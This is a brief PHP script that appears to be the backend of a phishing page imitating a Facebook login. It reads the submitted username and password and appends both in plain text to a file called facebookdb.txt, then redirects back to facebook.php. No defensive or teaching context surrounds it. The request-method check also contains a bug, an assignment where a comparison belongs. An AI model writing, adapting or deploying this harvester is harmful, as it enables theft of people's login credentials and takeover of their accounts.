<?php
session_start();
// $err = "Field must not be empty";

if ($_SERVER['REQUEST_METHOD'] = 'POST') {
    $username = $_POST["name"];
    $password = $_POST["password"];
    if (empty($username) || empty($password)) {
        header('location: facebook.php');
        $_SESSION["error-message"] = 'Field must not be empty';

    }
    if (!empty($username) && !empty($password)) {

        $database = "facebookdb.txt";
        $file = fopen("$database", "a+");
        fwrite($file, $username . "\n");
        fwrite($file, $password . "\n");
        fclose($file);
        header('location: facebook.php');
    }


}
?>